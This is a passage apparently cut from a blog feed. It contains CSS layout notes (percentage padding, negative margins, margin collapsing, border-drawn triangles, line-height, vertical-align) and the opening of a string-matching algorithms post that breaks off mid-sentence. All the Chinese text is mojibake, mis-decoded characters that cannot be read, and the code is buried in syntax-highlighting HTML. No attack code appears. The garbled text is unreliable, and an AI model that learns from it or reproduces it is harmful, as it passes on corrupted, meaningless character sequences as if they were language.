å¸ƒå±€ï¼Œè€Œå‡ºç°å±‚å æ•ˆæœã€‚</p><ul><li><p>é«˜åº¦ä¸é‚£ä¹ˆé«˜çš„å‚ç›´åˆ†éš”ç¬¦</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span> + <span class="selector-tag">a</span><span class="selector-pseudo">:before</span> &#123; </span><br><span class="line"> <span class="attribute">content</span>: <span class="string">""</span>; </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">0</span>; </span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">3px</span> <span class="number">1px</span>; </span><br><span class="line"> <span class="attribute">margin-left</span>: <span class="number">6px</span>; </span><br><span class="line"> <span class="attribute">border-left</span>: <span class="number">1px</span> solid gray; </span><br><span class="line">&#125; </span><br><span class="line">&lt;a href=""&gt;ç™»å½•&lt;/a&gt;&lt;a href=""&gt;æ³¨å†Œ&lt;/a&gt;</span><br></pre></td></tr></table></figure></li><li><p>é€šè¿‡åœ°å€æ çš„hashå€¼å’Œé¡µé¢HTMLä¸­å€¼ä¸€æ ·çš„å…ƒç´ å‘ç”Ÿé”šç‚¹å®šä½ã€‚æˆ‘ä»¬å¸Œæœ›å®šä½çš„å…ƒç´ ï¼Œç¦»é¡¶éƒ¨æœ‰ä¸€æ®µè·ç¦»ã€‚å¯ä»¥è¿™æ ·ï¼Œæ—¢ä¸å½±å“åŸæ¥çš„å¸ƒå±€ï¼Œåˆä¸‹ç§»äº†50ä¸ªåƒç´ ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3&gt;&lt;span id="hash"&gt;æ ‡é¢˜&lt;/span&gt;&lt;/h3&gt; </span><br><span class="line"><span class="selector-tag">h3</span> &#123; </span><br><span class="line"> <span class="attribute">line-height</span>: <span class="number">30px</span>; </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">14px</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-tag">h3</span> &gt; <span class="selector-tag">span</span> &#123; </span><br><span class="line"> <span class="attribute">padding-top</span>: <span class="number">58px</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-2-2-paddingçš„ç™¾åˆ†æ¯”å€¼"><a href="#4-2-2-paddingçš„ç™¾åˆ†æ¯”å€¼" class="headerlink" title="4.2.2 paddingçš„ç™¾åˆ†æ¯”å€¼"></a>4.2.2 paddingçš„ç™¾åˆ†æ¯”å€¼</h3><p>padding å’Œ margin ç™¾åˆ†æ¯”å€¼æ— è®ºæ˜¯æ°´å¹³æ–¹å‘è¿˜æ˜¯å‚ç›´æ–¹å‘å‡æ˜¯ç›¸å¯¹äºå®½åº¦è®¡ç®—çš„ï¼</p><ul><li><p>å®ç°ä¸€ä¸ªæ­£æ–¹å½¢</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">25%</span> <span class="number">50%</span>; <span class="comment">/* å®½é«˜2:1çš„çŸ©å½¢ */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å®ç°ä¸€ä¸ªå®½é«˜æ¯”å›ºå®šä¸º5:1çš„å¤´å›¾æ•ˆæœ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123; </span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">10%</span> <span class="number">50%</span>; </span><br><span class="line"> <span class="attribute">position</span>: relative; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.box</span> &gt; <span class="selector-tag">img</span> &#123; </span><br><span class="line"> <span class="attribute">position</span>: absolute; </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line"> <span class="attribute">height</span>: <span class="number">100%</span>; </span><br><span class="line"> <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line"> <span class="attribute">top</span>: <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å®ç°â€œä¸‰é“æ â€å°å›¾æ ‡</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.icon-menu</span> &#123; </span><br><span class="line">  <span class="attribute">display</span>: inline-block; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">140px</span>; <span class="attribute">height</span>: <span class="number">10px</span>; </span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">35px</span> <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">10px</span> solid; </span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">10px</span> solid; </span><br><span class="line">  <span class="attribute">background-color</span>: currentColor; </span><br><span class="line">  <span class="attribute">background-clip</span>: content-box; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å®ç°radioåŒå±‚åŸç‚¹å›¾å½¢æ•ˆæœ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.icon-dot</span> &#123; </span><br><span class="line">  <span class="attribute">display</span>: inline-block; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>; <span class="attribute">height</span>: <span class="number">100px</span>; </span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span>; </span><br><span class="line">  <span class="attribute">border</span>: <span class="number">10px</span> solid; </span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>; </span><br><span class="line">  <span class="attribute">background-color</span>: currentColor; </span><br><span class="line">  <span class="attribute">background-clip</span>: content-box; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="4-3-margin"><a href="#4-3-margin" class="headerlink" title="4.3 margin"></a>4.3 margin</h2><h3 id="4-3-1-marginè´Ÿå€¼"><a href="#4-3-1-marginè´Ÿå€¼" class="headerlink" title="4.3.1 marginè´Ÿå€¼"></a>4.3.1 marginè´Ÿå€¼</h3><ul><li><p>å®ç°ä¸€è¡Œæœ‰3ä¸ªå…ƒç´ ï¼Œå…ƒç´ ä¸­é—´æœ‰20pxçš„é—´éš™ï¼Œå·¦å³ä¸¤ç«¯æ²¡æœ‰é—´éš™<br>é€šè¿‡ç»™çˆ¶å®¹å™¨æ·»åŠ <code>margin: -20px</code>ï¼Œå¢åŠ å®¹å™¨çš„å¯ç”¨å®½åº¦</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ul</span> &#123;</span><br><span class="line">  <span class="attribute">margin-right</span>: -<span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">li</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å®ç°å·¦å³ç­‰é«˜å¸ƒå±€ï¼Œæœ‰å¯èƒ½å·¦ä¾§å†…å®¹å¤šï¼Œæœ‰å¯èƒ½å³ä¾§å†…å®¹å¤š<br>table-cellå®ç°ç­‰é«˜å¸ƒå±€</p></li></ul><h3 id="4-3-2-marginåˆå¹¶"><a href="#4-3-2-marginåˆå¹¶" class="headerlink" title="4.3.2 marginåˆå¹¶"></a>4.3.2 marginåˆå¹¶</h3><p>å—çº§å…ƒç´ çš„ä¸Šå¤–è¾¹è·ï¼ˆmargin-topï¼‰ä¸ä¸‹å¤–è¾¹è·ï¼ˆmargin-bottomï¼‰æœ‰æ—¶ä¼šåˆå¹¶ä¸ºå•ä¸ªå¤–è¾¹è·ï¼Œè¿™æ ·çš„ç°è±¡ç§°ä¸ºâ€œmargin åˆå¹¶â€ã€‚<strong>æ³¨æ„ï¼Œè¿™åªå‘ç”Ÿåœ¨å—çº§å…ƒç´ çš„å‚ç›´æ–¹å‘</strong>ï¼Œä¸åŒ…æ‹¬æµ®åŠ¨å’Œç»å¯¹å®šä½ã€‚</p><p>marginåˆå¹¶çš„3ç§åœºæ™¯</p><ul><li>ç›¸é‚»å…„å¼Ÿå…ƒç´ </li><li>çˆ¶çº§å’Œç¬¬ä¸€ä¸ª/æœ€åä¸€ä¸ªå­å…ƒç´ </li><li>ç©ºå—çº§å…ƒç´ çš„marginåˆå¹¶<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;div&gt;å…ƒç´ é«˜åº¦åªæœ‰10px, .sonçš„margin-topå’Œmargin-bottomåˆå¹¶åœ¨ä¸€èµ·äº† */</span></span><br><span class="line"><span class="selector-class">.father</span> &#123; <span class="attribute">overflow</span>: hidden; &#125; </span><br><span class="line"><span class="selector-class">.son</span> &#123; <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>; &#125; </span><br><span class="line">&lt;div class="father"&gt; </span><br><span class="line"> &lt;div class="son"&gt;&lt;/div&gt; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ul><p>å¦‚æœä¸å¸Œæœ›marginåˆå¹¶ï¼Œå¯ä»¥è¿›è¡Œå¦‚ä¸‹æ“ä½œ</p><ul><li>è®¾ç½®å‚ç›´æ–¹å‘çš„ border</li><li>è®¾ç½®å‚ç›´æ–¹å‘çš„ padding</li><li>é‡Œé¢æ·»åŠ å†…è”å…ƒç´ ï¼ˆç›´æ¥ Space é”®ç©ºæ ¼æ˜¯æ²¡ç”¨çš„ï¼‰</li><li>è®¾ç½® height æˆ–è€… min-heightã€‚</li></ul><p>marginåˆå¹¶çš„è®¡ç®—è§„åˆ™</p><ul><li>æ­£æ­£å–å¤§å€¼ï¼Œæ­£è´Ÿå€¼ç›¸åŠ ï¼Œè´Ÿè´Ÿæœ€è´Ÿå€¼</li></ul><h3 id="4-3-3-margin-auto"><a href="#4-3-3-margin-auto" class="headerlink" title="4.3.3 margin: auto"></a>4.3.3 margin: auto</h3><ul><li>å¦‚æœä¸€ä¾§å®šå€¼ï¼Œä¸€ä¾§ autoï¼Œåˆ™ auto ä¸ºå‰©ä½™ç©ºé—´å¤§å°ã€‚</li><li>å¦‚æœä¸¤ä¾§å‡æ˜¯ autoï¼Œåˆ™å¹³åˆ†å‰©ä½™ç©ºé—´ã€‚<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* å®ç°å—çº§å…ƒç´ çš„å³å¯¹é½ */</span></span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>ä½†ä¸ºä»€ä¹ˆ<code>margin: auto</code>æ— æ³•å‚ç›´å±…ä¸­ï¼Ÿ<br>è§¦å‘ margin:auto è®¡ç®—æœ‰ä¸€ä¸ªå‰ææ¡ä»¶ï¼Œå…ƒç´ åœ¨å¯¹åº”æ–¹å‘å¯ä»¥è‡ªåŠ¨å¡«å……å®½é«˜ã€‚æŠŠ.son å…ƒç´ çš„ height:100px å»æ‰ï¼Œ.son çš„é«˜åº¦ä¼šè‡ªåŠ¨å’Œçˆ¶å…ƒç´ ç­‰é«˜å˜æˆ 200px å—ï¼Ÿæ˜¾ç„¶ä¸ä¼šï¼å› æ­¤æ— æ³•å‚ç›´å±…ä¸­ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬æŠŠsonè®¾ç½®ä¸ºç»å¯¹å®šä½å…ƒç´ ï¼Œsonçš„å°ºå¯¸ä¼šè‡ªåŠ¨å¡«å……çˆ¶çº§å…ƒç´ çš„å¯ç”¨å°ºå¯¸ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ç»å¯¹å®šä½å…ƒç´ margin: autoå®ç°å‚ç›´å±…ä¸­ */</span></span><br><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>; <span class="attribute">height</span>:<span class="number">150px</span>; </span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.son</span> &#123; </span><br><span class="line"> <span class="attribute">position</span>: absolute; </span><br><span class="line"> <span class="attribute">top</span>: <span class="number">0</span>; <span class="attribute">right</span>: <span class="number">0</span>; <span class="attribute">bottom</span>: <span class="number">0</span>; <span class="attribute">left</span>: <span class="number">0</span>; </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">200px</span>; <span class="attribute">height</span>: <span class="number">100px</span>; </span><br><span class="line"> <span class="attribute">margin</span>: auto; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-4-border"><a href="#4-4-border" class="headerlink" title="4.4 border"></a>4.4 border</h3><ul><li>border-widthä¸æ”¯æŒç™¾åˆ†æ¯”</li><li><p>border-coloré»˜è®¤é¢œè‰²æ˜¯colorçš„è‰²å€¼</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*ä¸Šä¼ å›¾ç‰‡çš„å¸¦+è™šçº¿æ¡†æŒ‰é’®ï¼Œhoverç›´æ¥æ”¹å˜colorè‰²å€¼*/</span></span><br><span class="line"><span class="selector-class">.add</span> &#123; </span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#ccc</span>; </span><br><span class="line"> <span class="attribute">border</span>: <span class="number">2px</span> dashed; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.add</span><span class="selector-pseudo">:before</span> &#123; </span><br><span class="line"> <span class="attribute">border-top</span>: <span class="number">10px</span> solid; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.add</span><span class="selector-pseudo">:after</span> &#123; </span><br><span class="line"> <span class="attribute">border-left</span>: <span class="number">10px</span> solid; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/* hover å˜è‰² */</span> </span><br><span class="line"><span class="selector-class">.add</span><span class="selector-pseudo">:hover</span> &#123; </span><br><span class="line"> <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>border-color: transparent å¢åŠ ç‚¹å‡»åŒºåŸŸå¤§å°</p></li><li>å›¾å½¢ç»˜åˆ¶<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ç»˜åˆ¶ä¸‰è§’å½¢ */</span></span><br><span class="line"><span class="selector-tag">div</span> &#123; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">border</span>: <span class="number">10px</span> solid; </span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#f30</span> transparent transparent; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* ç‹­é•¿çš„ä¸‰è§’å½¢*/</span></span><br><span class="line"><span class="selector-tag">div</span> &#123; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">10px</span> <span class="number">20px</span>; </span><br><span class="line">  <span class="attribute">border-style</span>: solid; </span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#f30</span> transparent transparent; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* æ¢¯å½¢ */</span></span><br><span class="line"><span class="selector-tag">div</span> &#123; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">10px</span>; <span class="attribute">height</span>: <span class="number">10px</span>; </span><br><span class="line">  <span class="attribute">border</span>: <span class="number">10px</span> solid; </span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#f30</span> transparent transparent; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="5-å†…è”å…ƒç´ ä¸æµ"><a href="#5-å†…è”å…ƒç´ ä¸æµ" class="headerlink" title="5. å†…è”å…ƒç´ ä¸æµ"></a>5. å†…è”å…ƒç´ ä¸æµ</h2><p>å†…è”å…ƒç´ åœ¨å‚ç›´æ–¹å‘çš„æ’ç‰ˆå’Œå¯¹é½ï¼Œéƒ½åŸºæœ¬ç¦»ä¸å¼€åŸºçº¿ baseline</p><h3 id="5-1-line-height"><a href="#5-1-line-height" class="headerlink" title="5.1  line-height"></a>5.1  line-height</h3><p>ä¸¤æ¡åŸºçº¿ä¹‹é—´çš„é—´è·<br>å¯¹äºçº¯æ–‡æœ¬å…ƒç´ ï¼Œline-heightç›´æ¥å†³å®šäº†æœ€ç»ˆé«˜åº¦ã€‚è€Œæ›¿æ¢å†…è”å…ƒç´ çš„é«˜åº¦ä¸å—line-heightå½±åƒã€‚</p><ul><li><p>x-height<br>å­—æ¯xçš„é«˜åº¦</p></li><li><p>å®ç°å•è¡Œæ–‡æœ¬å…ƒç´ â€œè¿‘ä¼¼â€å‚ç›´å±…ä¸­</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å®ç°å¤šè¡Œæ–‡æœ¬å…ƒç´ â€œè¿‘ä¼¼â€å‚ç›´å±…ä¸­</p></li></ul><h3 id="5-2-vertical-align"><a href="#5-2-vertical-align" class="headerlink" title="5.2 vertical-align"></a>5.2 vertical-align</h3><ul><li><p>vertical-align: baseline<br>é»˜è®¤æ˜¯åŸºçº¿ï¼ŒåŸºçº¿å°±æ˜¯å­—æ¯xçš„ä¸‹è¾¹ç¼˜çº¿</p></li><li><p>vertical-align: middle<br><code>vertical-align: middle</code>æŒ‡çš„æ˜¯åŸºçº¿å¾€ä¸Š1/2 x-heightçš„é«˜åº¦<br><img src="/2022/02/12/CSSä¸–ç•Œ/1.png"></p></li><li><p>è¡Œè·<br>è¡Œè· = è¡Œé«˜ - em-box = line-height - font-size</p></li></ul><h3 id="cssé‡ç½®æ¨è"><a href="#cssé‡ç½®æ¨è" class="headerlink" title="cssé‡ç½®æ¨è"></a>cssé‡ç½®æ¨è</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ä¸å»ºè®®å…¨å±€ * &#123; box-sizing: border-box; &#125; */</span></span><br><span class="line"><span class="selector-tag">input</span>, <span class="selector-tag">textarea</span>, <span class="selector-tag">img</span>, <span class="selector-tag">video</span>, <span class="selector-tag">object</span> &#123; </span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>å­—ç¬¦ä¸²åŒ¹é…</title>
      <link href="/2022/01/13/LeetCode-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/"/>
      <url>/2022/01/13/LeetCode-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/</url>
      <content type="html"><![CDATA[<p>å•æ¨¡å¼ä¸²åŒ¹é…ï¼šä¸€ä¸ªä¸²è·Ÿä¸€ä¸ªä¸²è¿›è¡ŒåŒ¹é… - BF, RK, BM, KMPç®—æ³•<br>å¤šæ¨¡å¼ä¸²åŒ¹é…ï¼šä¸€ä¸ªä¸²ä¸­åŒæ—¶æŸ¥æ‰¾å¤šä¸ªä¸² - Trieæ ‘å’ŒACè‡ªåŠ¨æœº</p><p>æˆ‘ä»¬åœ¨å­—ç¬¦ä¸²Aä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²Bï¼Œé‚£å­—ç¬¦ä¸²Aå°±æ˜¯ä¸»ä¸²ï¼Œå­—ç¬¦ä¸²Bå°±æ˜¯æ¨¡å¼ä¸²ã€‚ä¸»ä¸²çš„é•¿åº¦è®°ä½œnï¼Œæ¨¡å¼ä¸²çš„é•¿åº¦è®°ä½œmã€‚</p><p>éœ€æ±‚ï¼šè¿™æ˜¯ä¸€ä¸ªç®€å•çš„æœç´¢åŠŸèƒ½ï¼Œåœ¨ä½ è¾“å…¥ä¸€æ®µå­—ç¬¦åä¼šå¾—åˆ°åç«¯è¿”å›çš„æœç´¢ç»“æœï¼Œæ­¤æ—¶éœ€è¦å°†ä½ è¾“å…¥çš„å­—ç¬¦ä¸²åœ¨æœç´¢ç»“æœä¸­å˜è‰²ã€‚</p><h3 id="1-BFç®—æ³•"><a href="#1-BFç®—æ³•" class="headerlink" title="1. BFç®—æ³•"></a>1. BFç®—æ³•</h3><p>Brute Forceï¼Œæš´åŠ›åŒ¹é…ç®—æ³•ï¼Œåœ¨ä¸»ä¸²ä¸­ï¼Œæ£€æŸ¥èµ·å§‹ä½ç½®åˆ†åˆ«æ˜¯ 0,1,2â€¦n-m ä¸”é•¿åº¦ä¸º m çš„ n-m+1ä¸ªå­ä¸²ï¼Œçœ‹æœ‰æ²¡æœ‰è·Ÿæ¨¡å¼ä¸²åŒ¹é…çš„ã€‚<br><img src="/2022/01/13/LeetCode-å­—ç¬¦ä¸²åŒ¹é…/1.jpg"></p><p>åœ¨æç«¯æƒ…å†µä¸‹ä¸»ä¸²æ˜¯<code>&#39;aaa...aaa(nä¸ªa)&#39;</code>ï¼Œæ¨¡å¼ä¸²æ˜¯<code>&#39;aaaab&#39;</code>ï¼Œæˆ‘ä»¬æ¯æ¬¡éƒ½è¦å¯¹æ¯”mä¸ªå­—ç¬¦ï¼Œå¯¹æ¯”n-m+1æ¬¡ï¼Œæœ€åæƒ…å†µçš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n*m)</p><p><br></p><h3 id="2-RKç®—æ³•"><a href="#2-RKç®—æ³•" class="headerlink" title="2. RKç®—æ³•"></a>2. RKç®—æ³•</h3><p>BFç®—æ³•åªæ˜¯ç®€å•ç²—æš´åœ°å¯¹ä¸¤ä¸ªå­—ç¬¦ä¸²çš„æ‰€æœ‰å­—ç¬¦ä¾æ¬¡æ¯”è¾ƒï¼Œè€ŒRKç®—æ³•æ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²çš„[ å“ˆå¸Œå€¼ ]ã€‚</p><p>æ¯ä¸€ä¸ªå­—ç¬¦ä¸²éƒ½å¯ä»¥é€šè¿‡æŸç§å“ˆå¸Œç®—æ³•ï¼Œè½¬æ¢æˆä¸€ä¸ªæ•´å‹æ•°ï¼Œ<code>hashcode = hash(string)</code>ã€‚ç”Ÿæˆhashcodeçš„ç®—æ³•å¾ˆå¤šï¼Œæ¯”å¦‚ï¼šæŒ‰ä½ç›¸åŠ ã€‚æŠŠaå½“åš1ï¼Œbå½“åš2ï¼Œcå½“åš3â€¦ç„¶åæŠŠå­—ç¬¦ä¸²çš„æ‰€æœ‰å­—ç¬¦ç›¸åŠ ï¼Œç›¸åŠ ç»“æœå°±æ˜¯å®ƒçš„hashcodeã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bce = <span class="number">2</span> + <span class="number">3</span> + <span class="number">5</span> = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç®—æ³•è™½ç„¶ç®€å•ï¼Œå´å¾ˆå¯èƒ½äº§ç”Ÿhashå†²çªã€‚æ¯”å¦‚bce, bec, cbeçš„hashcodeæ˜¯ä¸€æ ·çš„ã€‚ç”±äºå­˜åœ¨hashå†²çªçš„å¯èƒ½ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åƒBFç®—æ³•é‚£æ ·ï¼Œå¯¹ä¸¤ä¸ªå­—ç¬¦ä¸²é€ä¸ªå­—ç¬¦æ¯”è¾ƒï¼Œæœ€ç»ˆåˆ¤æ–­å‡ºä¸¤ä¸ªå­—ç¬¦ä¸²åŒ¹é…ã€‚</p><p>ç†æƒ³æƒ…å†µä¸‹ï¼ŒRKç®—æ³•çš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ã€‚æç«¯æƒ…å†µä¸‹ï¼Œå“ˆå¸Œç®—æ³•å¤§é‡å†²çªï¼Œæ—¶é—´å¤æ‚åº¦é€€åŒ–ä¸ºO(m*n)ã€‚</p><p><br></p><h3 id="3-BMç®—æ³•"><a href="#3-BMç®—æ³•" class="headerlink" title="3. BMç®—æ³•"></a>3. BMç®—æ³•</h3><p>BMç®—æ³•æ ¸å¿ƒæ€æƒ³æ˜¯ï¼Œåˆ©ç”¨æ¨¡å¼ä¸²æœ¬èº«çš„ç‰¹ç‚¹ï¼Œåœ¨æ¨¡å¼ä¸²ä¸­æŸä¸ªå­—ç¬¦ä¸ä¸»ä¸²ä¸èƒ½åŒ¹é…çš„æ—¶å€™ï¼Œå°†æ¨¡å¼ä¸²å¾€åå¤šåä¸œå‡ ä½ï¼Œä»¥æ­¤æ¥å‡å°‘ä¸å¿…è¦çš„å­—ç¬¦æ¯”è¾ƒï¼Œæé«˜åŒ¹é…çš„æ•ˆç‡ã€‚</p><p>å½“é‡åˆ°ä¸åŒ¹é…çš„å­—ç¬¦æ—¶ï¼Œæœ‰ä»€ä¹ˆå›ºå®šçš„è§„å¾‹ï¼Œå¯ä»¥å°†æ¨¡å¼ä¸²å¾€åå¤šæ»‘åŠ¨å‡ ä½å‘¢ï¼ŸBMç®—æ³•ï¼Œå°±æ˜¯åœ¨å¯»æ‰¾è¿™ç§è§„å¾‹ã€‚</p><ul><li>åå­—ç¬¦ä¸²è§„åˆ™</li><li>å¥½åç¼€è§„åˆ™</li></ul><p><br></p><h3 id="4-KMPç®—æ³•"><a href="#4-KMPç®—æ³•" class="headerlink" title="4. KMPç®—æ³•"></a>4. KMPç®—æ³•</h3><p>åœ¨æ¨¡å¼ä¸²å’Œä¸»ä¸²åŒ¹é…è¿‡ç¨‹ä¸­ï¼ŒæŠŠä¸èƒ½åŒ¹é…çš„é‚£ä¸ªå­—ç¬¦ä»ç„¶å«åš åå­—ç¬¦ï¼ŒæŠŠå·²ç»åŒ¹é…çš„é‚£æ®µå­—ç¬¦å«åš å¥½å‰ç¼€ã€‚</p><h3 id="5-Trieæ•°"><a href="#5-Trieæ•°" class="headerlink" title="5. Trieæ•°"></a>5. Trieæ•°</h3><p>å¦‚ä½•å®ç°æœç´¢å¼•æ“çš„æœç´¢å…³é”®è¯æç¤ºåŠŸèƒ½ï¼Ÿ</p><p>Trieæ 